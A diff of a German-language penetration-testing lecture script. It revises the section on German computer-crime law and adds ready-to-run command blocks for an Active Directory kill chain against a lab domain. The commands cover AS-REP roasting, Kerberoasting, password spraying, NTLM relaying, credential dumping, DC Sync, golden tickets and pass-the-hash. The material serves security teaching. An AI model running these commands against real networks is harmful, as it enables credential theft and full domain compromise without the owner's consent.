@@ -33,35 +33,37 @@ Das Skript wird aktiv weiterentwickelt. Falls dir Fehler oder Verbesserungsmögl
 
 
 
-# 1. Rahmbedingungen
+# 1. Rahmenbedingungen
 ## 1.1 Relevante Paragraphen und rechtliche Grundlagen
-### §202a: Ausspähen von Daten (Absatz a und b)
+### §202a: Ausspähen von Daten (Absätze 1 und 2)
 
-Absatz 1 besagt, dass unbefugtes Verschaffen von Zugang zu geschützten Daten mit Freiheitsstrafe bis zu 3 Jahren oder mit Geldstrafe bestraft wird. Wichtig ist hier das Wort "unbefugt", das die Intention des Handelnden berücksichtigt. Die Überwindung von Zugangssicherungen, auch wenn diese ineffektiv sind, ist ebenfalls strafbar. Absatz 2 stellt klar, dass nur elektronisch oder magnetisch gespeicherte oder übermittelte Daten betroffen sind.
+Der Paragraf §202a des Strafgesetzbuchs behandelt das Ausspähen von Daten. Absatz 1 besagt, dass das unbefugte Verschaffen von Zugang zu besonders geschützten Daten eine Straftat darstellt, die mit einer Freiheitsstrafe von bis zu drei Jahren oder mit Geldstrafe geahndet wird. Das zentrale Kriterium hierbei ist das Wort "unbefugt", da es auf die Absicht des Handelnden abstellt. Auch das Überwinden von Zugangssicherungen, selbst wenn diese technisch schwach sind, gilt als strafbare Handlung. Absatz 2 präzisiert, dass dieser Paragraf nur für elektronisch oder magnetisch gespeicherte bzw. übermittelte Daten Anwendung findet.
 
-### §202b: Abfangen von Daten (Absatz a und b)
+### §202b: Abfangen von Daten 
 
-Dieser Paragraf bestraft das unbefugte Erlangen von Daten aus nicht-öffentlichen Übermittlungen oder elektromagnetischer Strahlung mit Freiheitsstrafe bis zu 2 Jahren oder Geldstrafe. Der Einsatz technischer Mittel, um an nicht für einen bestimmte Daten zu gelangen, ist strafbar. Dies gilt auch für das Abhören von drahtlosen und drahtgebundenen Übertragungen.
+§202b bezieht sich auf das unbefugte Abfangen von Daten aus nicht öffentlichen Übermittlungen. Darunter fällt sowohl das Abfangen von Datenübertragungen über elektromagnetische Strahlung als auch über kabelgebundene Kanäle. Das Abhören von Datenübertragungen, für die man keine ausdrückliche Erlaubnis besitzt, wird mit bis zu zwei Jahren Freiheitsstrafe oder mit Geldstrafe bestraft. Besonders hervorzuheben ist, dass der Einsatz technischer Mittel zur Erlangung nicht-autorisierten Zugangs explizit als strafbar eingestuft wird.
 
-### §202c: Vorbereitung des Ausspähens und Abfangens von Daten (Fortsetzung)
+### §202c: Vorbereitung des Ausspähens und Abfangens von Daten
 
-Hacking-Tools können darunter fallen, wenn sie explizit für das unbefugte Eindringen oder Abfangen von Daten verwendet werden sollen. Die Verwendung von Tools zu Testzwecken, wie etwa bei einem legitimen Pentest mit vorheriger Zustimmung des Eigentümer der Systeme, fällt normalerweise nicht unter diesen Paragrafen, da hier keine Straftat beabsichtigt ist. Eine wichtige Abgrenzung besteht also darin, ob das Werkzeug zu legalen Zwecken eingesetzt wird oder eine böswillige Absicht dahintersteht.
+Dieser Paragraph deckt die Vorbereitungshandlungen ab, die für das Ausspähen oder Abfangen von Daten notwendig sind. Darunter fallen insbesondere sogenannte Hacking-Tools, sofern sie für das unbefugte Eindringen in Systeme verwendet werden sollen. Die Strafbarkeit richtet sich nach der Intention, mit der solche Werkzeuge eingesetzt werden. Sofern beispielsweise Tools zur Sicherheitsüberprüfung, also für legitime Penetrationstests verwendet werden, die im Vorfeld mit ausdrücklicher Zustimmung des Eigentümer der Systeme vereinbart wurden, besteht keine Strafbarkeit. Wichtig ist daher eine klare Abgrenzung zwischen legalen Anwendungen (z. B. Sicherheitstests) und böswilligen Absichten.
 
-### §303a: Datenveränderung (Absatz a und b)
+### §303a: Datenveränderung 
 
-Das unbefugte Löschen, Unterdrücken, Verändern oder Unbrauchbarmachen von Daten wird mit Freiheitsstrafe bis zu 2 Jahren oder mit Geldstrafe bestraft. Eine Ausnahme bildet hier der Fall, wenn der Betroffene die ausdrückliche Erlaubnis des Dateneigentümer hat, beispielsweise im Rahmen eines geplanten Stresstests.
+§303a bestraft das unbefugte Löschen, Unterdrücken, Verändern oder Unbrauchbarmachen von Daten. Dieses Verhalten kann mit einer Freiheitsstrafe von bis zu zwei Jahren oder mit Geldstrafe belegt werden. Eine wichtige Ausnahme ist der Fall, dass eine ausdrückliche Erlaubnis des Dateneigentümer vorliegt. Dies ist zum Beispiel im Rahmen eines vereinbarten Stresstests der Fall, bei dem das Verhalten eines Systems unter hoher Last geprüft werden soll. Hier ist der rechtliche Rahmen entscheidend, um strafrechtliche Konsequenzen zu vermeiden.
 
-### §303b: Computersabotage (Absatz a und b)
+### §303b: Computersabotage 
 
-Absatz 1 definiert Computersabotage als Eingriffe in Datenverarbeitungsvorgänge, die den Betrieb eines Unternehmens oder einer Behörde stören. Dies umfasst auch den Angriff auf IT-Systeme, die zum Beispiel in Krankenhäusern, Kraftwerken oder anderen kritischen Infrastrukturen verwendet werden. Strafen reichen hier bis zu 5 Jahren Freiheitsentzug, was die Schwere von Angriffen auf kritische Systeme betont.
+Dieser Paragraph bezieht sich auf die gezielte Störung von Datenverarbeitungsprozessen, insbesondere wenn diese den Betrieb von Unternehmen oder Behörden beeinträchtigen. Absatz 1 definiert Computersabotage als Eingriff in IT-Systeme, der zu einer Betriebsstörung führt. Besonders kritisch ist dies bei Angriffen auf IT-Infrastrukturen, die für die Versorgung der Öffentlichkeit relevant sind, wie Krankenhäuser oder Kraftwerke. Die Strafandrohung reicht hier bis zu fünf Jahren Freiheitsstrafe und zeigt die besondere Schwere solcher Eingriffe, insbesondere wenn sie die Versorgungssicherheit gefährden.
 
 ### §206: Verletzung des Fernmeldegeheimnisses
 
-Das Abhören und das Zugänglichmachen von Inhalten einer nicht öffentlichen Telekommunikation an Dritte ist strafbar. Ein Penetrationstester, der in Kommunikationssysteme eindringt, könnte sich schnell strafbar machen, wenn er keine explizite Zustimmung von den Kommunikationsparteien hat. Auch der Zugriff auf Metadaten fällt unter das Fernmeldegeheimnis.
+Das Fernmeldegeheimnis ist in §206 StGB geregelt und betrifft das Abhören und Zugänglichmachen von nicht öffentlicher Telekommunikation an Dritte. Dies betrifft sowohl die Inhalte der Kommunikation als auch die zugehörigen Metadaten. Ein Penetrationstester, der in Kommunikationssysteme eindringt, könnte sich strafbar machen, wenn keine ausdrückliche Zustimmung der Kommunikationsparteien vorliegt. Hier ist besondere Vorsicht geboten, da der Schutz der Privatsphäre und der Vertraulichkeit der Kommunikation ein hohes rechtliches Gut darstellt.
 
 ### Fazit zur Rechtslage im Pentesting
 
-Der rechtliche Rahmen macht klar, dass Pentests ohne klare und schriftliche Zustimmung des Eigentümer oder Betreibers der IT-Infrastruktur strafrechtlich verfolgt werden können. Ein umfassender Vertrag und die Zustimmung aller Beteiligten sind entscheidend, um die Legalität der Aktivitäten zu gewährleisten. Der Unterschied zwischen einem ethischen Hacker und einem Cyberkriminellen ist hier im Wesentlichen der rechtliche Rahmen und die Einwilligung.
+Die gesetzliche Lage zeigt, dass Penetrationstests ohne ausdrückliche und schriftliche Zustimmung des Eigentümer oder Betreibers der IT-Infrastruktur klare strafrechtliche Risiken bergen. Ein umfassender Vertrag, der die Rahmenbedingungen, den Umfang und die Ziele des Pentests genau definiert, ist essentiell, um strafrechtliche Konsequenzen zu vermeiden. Der entscheidende Unterschied zwischen ethischem Hacking und Cyberkriminalität liegt in der Zustimmung aller Beteiligten und der Einhaltung gesetzlicher Vorgaben. Nur durch klare rechtliche Rahmenbedingungen und eine saubere Dokumentation der Einwilligung lassen sich strafbare Handlungen vermeiden und Sicherheit für alle Beteiligten gewährleisten.
+
+
 
 ## 1.2 Ablauf und Herausforderungen bei Responsible Disclosure
 
@@ -122,7 +124,14 @@ Zertifizierungen sind wichtig, um potenziellen Arbeitgebern oder Kunden die eige
 Weitere Informationen zu Zertifizierungen und eine Roadmap, die einen Überblick über den Zertifizierungsweg gibt, sind [hier online verfügbar](https://pauljerimy.com/security-certification-roadmap/).
 
 ### Knowledgebase
-Eine gut strukturierte Knowledgebase ist ein wertvolles Werkzeug für jeden Security Researcher. Sie ermöglicht es, erprobte Techniken, Angriffe und exakte Kommandos zentral zu speichern, sodass man im Ernstfall sofort auf relevante Informationen zugreifen kann, ohne erst langwierige Internetrecherchen durchführen zu müssen. Dies erhöht die Effizienz und reduziert Fehler in kritischen Situationen.
+
+Eine gut strukturierte Knowledgebase ist ein wertvolles Werkzeug für jeden Security Researcher. Sie ermöglicht es, erprobte Techniken, Angriffe und Commands zentral zu speichern, sodass man im sofort auf relevante Informationen zugreifen kann, ohne erst langwierige Internetrecherchen durchführen zu müssen. Dies erhöht die Effizienz und reduziert Fehler in verschiedenen Situationen.
+
+Tools wie **Notion** und **Obsidian** eignen sich hervorragend zur Erstellung und Pflege einer Knowledgebase. Notion bietet eine vielseitige Plattform, die sowohl als Wissensspeicher als auch zur Projektorganisation genutzt werden kann. Mit seiner intuitiven Benutzeroberfläche und den Möglichkeiten zur Einbettung von Multimedia-Inhalten lassen sich komplexe Themen übersichtlich strukturieren. Beispielsweise können Tabellen, Dokumente, und Code-Snippets integriert werden, um alle relevanten Informationen zentral vorzuhalten.
+
+**Obsidian** hingegen bietet eine lokal gespeicherte Lösung, die durch das Verwenden von Markdown-Dateien eine schnelle und flexible Erstellung von Dokumentationen ermöglicht. Besonders nützlich ist die graphische Darstellung der Verknüpfungen zwischen einzelnen Dokumenten, was eine Art Wissensnetzwerk erzeugt. Diese Graphenansicht hilft dabei, Zusammenhänge zwischen Angriffstechniken oder Tools zu erkennen und somit ein tieferes Verständnis zu entwickeln. Gerade für Security Researcher, die ohne Cloud-Lösung arbeiten möchten, stellt Obsidian eine sichere und private Alternative dar.
+
+Weitere Tools wie **Joplin**, **Zettlr** oder auch **Standard Notes** bieten ebenfalls Optionen zur flexiblen und sicheren Dokumentation von Wissen, je nach individuellen Anforderungen. Jedes dieser Tools hat seine Stärken, ob es um die Zusammenarbeit im Team, die Offline-Funktionalität oder die Verschlüsselung der Daten geht. Die Wahl des passenden Tools hängt dabei von persönlichen Vorlieben und Anforderungen an die Sicherheit ab.
 
 
 # 2. OSINT
@@ -319,6 +328,10 @@ Im Alltag dient Active Directory zur Authentifizierung von Benutzern und Admins 
 
 In diesem Abschnitt der Vorlesung werden beispielhafte Angriffe gegen Active Directory dargestellt, die als eine potenzielle Kill Chain beschrieben werden. Die Reihenfolge der Schritte kann dabei variieren oder wiederholt werden. Die vorgestellten Angriffe sind nur ein kleiner Ausschnitt aus dem breiten Spektrum an möglichen Angriffen.
 
+# Angriffsszenario gegen Active Directory
+
+In diesem Abschnitt der Vorlesung werden beispielhafte Angriffe gegen Active Directory dargestellt, die als eine potenzielle Kill Chain beschrieben werden. Die Reihenfolge der Schritte kann dabei variieren oder wiederholt werden. Die vorgestellten Angriffe sind nur ein kleiner Ausschnitt aus dem breiten Spektrum an möglichen Angriffen.
+
 ## 1. Lokale Privilegieneskalation
 Der erste Schritt einer solchen Kill Chain ist oft die lokale Privilegieneskalation, um lokale Administratorrechte zu erlangen. Dies kann auf verschiedene Weise erfolgen, wobei Tools wie **WinPEAS** zur automatisierten Prüfung genutzt werden. Zwei wichtige Methoden sind:
 
@@ -326,18 +339,47 @@ Der erste Schritt einer solchen Kill Chain ist oft die lokale Privilegieneskalat
 
 - **Modifiable Service Files**: Hierbei wird die Datei, die von einem Dienst ausgeführt wird, durch eine manipulierte Version ersetzt, die dem Angreifer Administratorrechte oder eine Shell mit höheren Rechten verschafft.
 
+```shell
+. .\PowerUp.ps1
+
+Invoke-AllChecks
+Get-ServiceUnquoted -Verbose
+Get-ModifiableServiceFile -Verbose
+
+Invoke-ServiceAbuse -Name 'SNMPTTRAP' -UserName 'dcorp\student454'
+```
+
 ## 2. Netzwerkaufklärung (Enumeration)
 Nach der lokalen Privilegieneskalation erfolgt die Netzwerkaufklärung. Ein allgemeiner Scan, z.B. mit **nmap**, dient dazu, vorhandene Dienste und Geräte im Netzwerk zu identifizieren. Weitere Informationen über das Active Directory, wie z.B. den Domänencontroller, Child Domains oder andere Dienste, können ebenfalls gesammelt werden.
 
 Zusätzlich kann eine **Interaktion über SMB** erfolgen. Da Active Directory oft mit SMB arbeitet, können hier Informationen über Geräte und Domänen gesammelt werden. Mit **enum4linux** lassen sich neben Benutzerlisten auch Gruppen und Passwortrichtlinien ermitteln.
 
 Falls anonyme Abfragen nicht möglich sind, kann **Brute-Forcing** verwendet werden, um valide Benutzernamen zu identifizieren. Oftmals ermöglichen schlecht konfigurierte Shares eine anonyme Auflistung von Dateien, die sensible Informationen enthalten können.
+```shell
+# NMAP Scan
+nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10-12,22-23
+
+nxc smb 192.168.56.1/24
+
+enum4linux 192.168.56.11
+```
 
 ## 3. AS-REP Roasting
 Beim **AS-REP Roasting** wird ein Ticket Granting Ticket (TGT) ohne vorherige Authentifizierung angefordert, was aus Kompatibilitätsgründen von Microsoft ermöglicht wurde. Der verschlüsselte Session Key im TGT kann mit Tools wie **Hashcat** geknackt werden, um das Benutzerpasswort herauszufinden.
+```shell
+GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt
+
+hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt
+```
 
 ## 4. Password Spraying
 **Password Spraying** ist besonders effektiv gegen Active Directory, da normale Benutzerkonten oft schwache Passwörter verwenden. Hierbei wird ein Passwort für alle Benutzer getestet, wodurch die Lockout-Mechanismen umgangen werden. Häufig wird die Kombination **Passwort = Benutzername** verwendet, oder typische Passwörter wie "Sommer25!" oder "Welcome1!".
+
+```shell
+nxc smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce
+
+sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2
+```
 
 ## 5. Bloodhound
 Bei großen Active Directory-Instanzen bietet sich **Bloodhound** an, um die vielen Informationen aus der Enumeration effizient zu verarbeiten. Mit dem Tool **SharpHound** werden Daten gesammelt, die dann in **Bloodhound** importiert und visualisiert werden. So lassen sich Angriffswege im Active Directory identifizieren.
@@ -346,25 +388,112 @@ Bei großen Active Directory-Instanzen bietet sich **Bloodhound** an, um die vie
   - Direkt vom Domänencontroller: Informationen über Gruppen, Trusts und Benutzer werden abgefragt.
   - Von einzelnen PCs: Hierbei werden Informationen zu lokalen Administrationsrechten und Anmeldungen gesammelt.
 
+```powershell
+xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
+
+.\sharphound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
+.\sharphound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
+.\sharphound.exe -d essos.local -c all --zipfilename bh_essos.zip
+
+```
+
 ## 6. Kerberoasting
 Verfügt der Angreifer über ein gültiges Benutzerkonto, kann **Kerberoasting** durchgeführt werden. Hierbei wird ein Ticket Granting Service (TGS) angefordert, das mit dem Passwort des Dienstes verschlüsselt ist. Der Angriff erfolgt offline und bleibt oft unbemerkt.
+
+```shell
+GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
+
+nxc ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
+
+hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
+```
 
 ## 7. Enumeration von Shares mit Credentials
 Nachdem Zugangsdaten erlangt wurden, sollten **Shares erneut** auf Zugriffsrechte und sensible Dateien untersucht werden, da diese wertvolle Informationen enthalten können.
 
+```shell
+nxc smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares
+```
+
 ## 8. Broadcast Poisoning
 **Broadcast Poisoning** nutzt aus, dass Windows-Geräte verschiedene Broadcasts senden, z.B. zur Namensauflösung über den **NetBIOS Name Service (NBT-NS)**. Der Angreifer kann diese Broadcasts abfangen und mit gefälschten Antworten reagieren, um **NTLM-Anmeldeinformationen** zu erlangen.
 
+```shell
+responder -I eth0
+
+hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt 
+```
+
 ## 9. NTLM Relaying
 Wenn **SMB Signing** deaktiviert ist, können Anfragen abgefangen und an andere Server weitergeleitet werden. Der Angreifer agiert als Vermittler und baut im Namen des Clients eine Session auf.
+
+```shell
+cme smb 192.168.56.10-23 --gen-relay-list relay.txt
+
+sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
+sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
+
+ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks
+responder -I eth0
+```
 
 ## 10. Credential Dumping
 Mit **Credential Dumping** werden Keys und Tickets, die auf einem PC gespeichert sind, extrahiert. Tools wie **Mimikatz** oder **LaZagne** können dazu verwendet werden. Auch ohne lokale Administratorrechte können gespeicherte Passwörter, z.B. aus **Chrome**, mit Tools wie **DonPapi** extrahiert werden.
 
 Credential Dumping kann mit **NTLM Relaying** kombiniert werden, um automatisiert Credentials von verschiedenen Systemen zu erhalten, was zu einem Totalausfall des Active Directory führen kann.
 
+```shell
+python3 secretsdump.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 
+
+lsassy -d north.sevenkingdoms.local -u jeor.mormont -p _L0ngCl@w_ 192.168.56.22 -m dumpertdll -O dumpertdll_path=/workspace/Outflank-Dumpert-DLL.dll
+```
 ## 11. DC Sync
 **DC Sync** ist eine Technik, bei der ein Angreifer die Funktionalität der Active Directory-Replikation ausnutzt, um Anmeldeinformationen direkt von einem Domain Controller zu extrahieren. Ein Angreifer, der über ausreichende Rechte (z.B. replizierende Directory-Änderungen) verfügt, kann die Datenbank des Domain Controllers nachbilden, einschließlich aller Passwort-Hashes. Tools wie **Mimikatz** ermöglichen es, diese Informationen abzufragen und somit Zugang zu hochprivilegierten Accounts, einschließlich des Domain Admins, zu erhalten. Dies macht DC Sync zu einem äußerst gefährlichen Angriff, der das gesamte Netzwerk kompromittieren kann.
+```shell
+secretsdump -just-dc-ntlm essos.local/Username:Password@meereen.essos.local
+```
+
+## 12. Golden Ticket Angriff
+Ein **Golden Ticket Angriff** nutzt eine Schwachstelle in der Kerberos-Authentifizierung aus. Angreifer, die Zugriff auf den **KRBTGT**-Account im Active Directory erlangt haben, können **Golden Tickets** erstellen, die uneingeschränkten Zugriff auf alle Ressourcen der Domäne ermöglichen. Der **KRBTGT**-Account ist der Account, den der Key Distribution Center (KDC) verwendet, um TGTs zu verschlüsseln. Da der Angreifer in der Lage ist, eigene Tickets zu erstellen, kann er beliebige Rechte und sogar Administratorzugriff auf das gesamte Netzwerk erhalten. Solche Tickets sind schwer zu erkennen und ermöglichen es dem Angreifer, langfristig im Netzwerk präsent zu bleiben.
+```shell
+kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt
+
+
+ticketer.py -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local Administrator
+```
+
+## 13. Lateral Movement
+Das Ziel des Angreifers ist es oft, sich im Netzwerk weiter zu bewegen, um schließlich privilegierte Systeme oder Konten zu kompromittieren. **Lateral Movement** kann durch verschiedene Techniken erreicht werden, wie z.B. **Pass-the-Hash**, **Pass-the-Ticket** oder **Overpass-the-Hash**. Dabei wird oft auf Werkzeuge wie **PsExec** oder **WMIC** zurückgegriffen, um Remotezugriff zu erlangen. Ziel ist es, Zugang zu weiteren Systemen zu erhalten und schrittweise die Berechtigungen zu erhöhen.
+
+### Pass-the-Hash Angriff
+Beim **Pass-the-Hash Angriff** wird der NTLM-Hash eines Benutzerkontos verwendet, um eine Authentifizierung zu initiieren, ohne das eigentliche Passwort zu kennen. Dies ist besonders effektiv in Umgebungen, in denen noch NTLM für die Authentifizierung verwendet wird. Tools wie **Mimikatz** ermöglichen es, die Hashes aus dem Speicher eines kompromittierten Rechners zu extrahieren. Mit diesem Hash kann der Angreifer sich dann im gesamten Netzwerk authentifizieren und lateral bewegen, ohne das Passwort im Klartext zu benötigen.
+```shell
+nxc smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --local-auth
+nxc smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4'
+
+psexec -hashes 'cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
+
+wmiexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
+
+smbexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
+
+atexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
+
+dcomexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
+
+nxc smb 192.168.56.11 -H ':cba36eccfd9d949c73bc73715364aff5' -d 'north' -u 'catelyn.stark' -x whoami
+
+evil-winrm -i 192.168.56.11 -u catelyn.stark -H 'cba36eccfd9d949c73bc73715364aff5'
+```
+
+### OverPass-the-Hash Angriff
+Beim Overpass-the-Hash Angriff (auch als Pass-the-Key bekannt) wird anstelle des NTLM-Hashes ein Kerberos-Schlüssel (in der Regel der NTLM-Hash) genutzt, um ein Kerberos-Ticket zu generieren und sich im Netzwerk zu authentifizieren. Dieser Angriff wird möglich, wenn der Angreifer Zugriff auf den NTLM-Hash eines Benutzerkontos hat und diesen verwendet, um TGTs (Ticket Granting Tickets) in einer Kerberos-Umgebung zu erzeugen. Tools wie Rubeus oder Mimikatz unterstützen die Durchführung dieses Angriffs, indem sie den NTLM-Hash in ein gültiges Kerberos-Ticket umwandeln. Dies ermöglicht eine Authentifizierung im Netzwerk auf Kerberos-Level und ermöglicht eine potenziell noch weitergehende laterale Bewegung, da Kerberos in modernen Netzwerken bevorzugt wird
+```shell
+getTGT.py -hashes ':cba36eccfd9d949c73bc73715364aff5' north.sevenkingdoms.local/catelyn.stark
+export KRB5CCNAME=/workspace/tgt/catelyn.stark.ccache
+wmiexec.py -k -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell
+```
+
 
 # Web Pentesting
 
